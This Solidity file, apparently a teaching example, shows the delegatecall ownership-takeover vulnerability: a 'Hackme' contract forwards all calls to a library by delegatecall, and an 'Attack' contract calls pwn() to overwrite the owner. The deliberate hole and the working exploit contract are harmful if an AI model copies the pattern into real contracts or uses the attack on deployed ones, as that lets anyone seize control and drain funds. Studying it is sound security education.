// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract Hackme {
    address public owner;
    Lib public lib;

    constructor(address _lib) {
        owner = msg.sender;
        lib = Lib(_lib);
    }

    fallback() external {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}